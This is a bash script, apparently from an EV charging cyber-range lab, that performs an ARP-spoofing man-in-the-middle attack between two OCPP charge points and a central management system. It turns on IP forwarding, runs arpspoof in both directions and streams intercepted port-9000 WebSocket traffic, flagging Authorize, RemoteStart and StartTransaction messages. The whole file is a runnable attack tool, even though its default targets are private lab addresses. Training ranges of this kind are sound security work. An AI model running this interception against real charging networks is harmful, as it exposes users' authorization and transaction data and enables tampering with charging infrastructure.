#!/bin/bash
# OCPP Man-in-the-Middle Attack Script
# Intercepts traffic between Charge Points and CSMS

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Target IPs (adjust as needed)
CSMS_IP="${CSMS_IP:-172.20.0.2}"
CP1_IP="${CP1_IP:-172.20.0.5}"
CP2_IP="${CP2_IP:-172.20.0.3}"
INTERFACE="${INTERFACE:-eth0}"

echo -e "${RED}╔═══════════════════════════════════════════╗${NC}"
echo -e "${RED}║   OCPP Man-in-the-Middle Attack Tool      ║${NC}"
echo -e "${RED}║   EV-CyberRange Security Lab              ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Targets:${NC}"
echo "  CSMS: $CSMS_IP"
echo "  CP1:  $CP1_IP"
echo "  CP2:  $CP2_IP"
echo ""

# Enable IP forwarding
echo -e "${GREEN}[+] Enabling IP forwarding...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# Function to cleanup on exit
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f arpspoof 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[+] Cleanup complete${NC}"
    exit 0
}
trap cleanup SIGINT SIGTERM

# Start ARP spoofing in background
echo -e "${GREEN}[+] Starting ARP spoofing...${NC}"

# Spoof CP1 <-> CSMS
arpspoof -i $INTERFACE -t $CP1_IP $CSMS_IP 2>/dev/null &
arpspoof -i $INTERFACE -t $CSMS_IP $CP1_IP 2>/dev/null &

# Spoof CP2 <-> CSMS
arpspoof -i $INTERFACE -t $CP2_IP $CSMS_IP 2>/dev/null &
arpspoof -i $INTERFACE -t $CSMS_IP $CP2_IP 2>/dev/null &

sleep 2

echo -e "${GREEN}[+] MitM active!${NC}"
echo ""
echo -e "${YELLOW}Now you can:${NC}"
echo "  1. Open Wireshark and capture on $INTERFACE"
echo "  2. Filter: tcp.port == 9000"
echo "  3. You'll see OCPP WebSocket traffic"
echo ""
echo -e "${YELLOW}Or capture directly:${NC}"
echo "  tcpdump -i $INTERFACE -A 'port 9000'"
echo ""
echo -e "${RED}Press Ctrl+C to stop the attack${NC}"

# Keep running and show intercepted traffic
tcpdump -i $INTERFACE -l -A 'port 9000' 2>/dev/null | while read line; do
    if echo "$line" | grep -qE '(BootNotification|Heartbeat|RemoteStart|StartTransaction|Authorize|MeterValues)'; then
        echo -e "${GREEN}[OCPP]${NC} $line"
    fi
done

wait
